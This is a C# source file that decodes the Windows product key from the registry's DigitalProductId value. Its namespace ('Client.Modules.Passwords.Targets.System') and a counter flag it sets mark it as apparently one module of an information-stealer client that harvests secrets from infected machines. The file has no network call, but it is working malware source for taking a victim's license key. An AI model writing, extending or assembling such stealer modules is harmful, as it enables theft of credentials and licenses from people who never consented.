using System;
using System.Collections;
using Client.Modules.Passwords.Helpers;
using Microsoft.Win32;

namespace Client.Modules.Passwords.Targets.System;

public class ProductKey
{
	public enum DigitalProductIdVersion
	{
		UpToWindows7,
		Windows8AndUp
	}

	public static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
	{
		string text = string.Empty;
		digitalProductId[66] = (byte)((digitalProductId[66] & 0xF7u) | 0u);
		int num = 0;
		for (int num2 = 24; num2 >= 0; num2--)
		{
			int num3 = 0;
			for (int num4 = 14; num4 >= 0; num4--)
			{
				num3 *= 256;
				num3 = digitalProductId[num4 + 52] + num3;
				digitalProductId[num4 + 52] = (byte)(num3 / 24);
				num3 %= 24;
				num = num3;
			}
			text = "BCDFGHJKMPQRTVWXY2346789"[num3] + text;
		}
		string text2 = text.Substring(1, num);
		string text3 = text.Substring(num + 1, text.Length - (num + 1));
		text = text2 + "N" + text3;
		for (int i = 5; i < text.Length; i += 6)
		{
			text = text.Insert(i, "-");
		}
		return text;
	}

	private static string DecodeProductKey(byte[] digitalProductId)
	{
		char[] array = new char[24]
		{
			'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P',
			'Q', 'R', 'T', 'V', 'W', 'X', 'Y', '2', '3', '4',
			'6', '7', '8', '9'
		};
		char[] array2 = new char[29];
		ArrayList arrayList = new ArrayList();
		for (int i = 52; i <= 67; i++)
		{
			arrayList.Add(digitalProductId[i]);
		}
		for (int num = 28; num >= 0; num--)
		{
			if ((num + 1) % 6 == 0)
			{
				array2[num] = '-';
			}
			else
			{
				int num2 = 0;
				for (int num3 = 14; num3 >= 0; num3--)
				{
					int num4 = (num2 << 8) | (byte)arrayList[num3];
					arrayList[num3] = (byte)(num4 / 24);
					num2 = num4 % 24;
					array2[num] = array[num2];
				}
			}
		}
		return new string(array2);
	}

	private static string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId, DigitalProductIdVersion digitalProductIdVersion)
	{
		if (digitalProductIdVersion != DigitalProductIdVersion.Windows8AndUp)
		{
			return DecodeProductKey(digitalProductId);
		}
		return DecodeProductKeyWin8AndUp(digitalProductId);
	}

	public static string GetWindowsProductKeyFromRegistry()
	{
		RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
		object obj = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")?.GetValue("DigitalProductId");
		if (obj == null)
		{
			return "Failed to get DigitalProductId from registry";
		}
		byte[] digitalProductId = (byte[])obj;
		registryKey.Close();
		bool flag = (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2) || Environment.OSVersion.Version.Major > 6;
		Counter.ProductKey = true;
		return GetWindowsProductKeyFromDigitalProductId(digitalProductId, flag ? DigitalProductIdVersion.Windows8AndUp : DigitalProductIdVersion.UpToWindows7);
	}
}
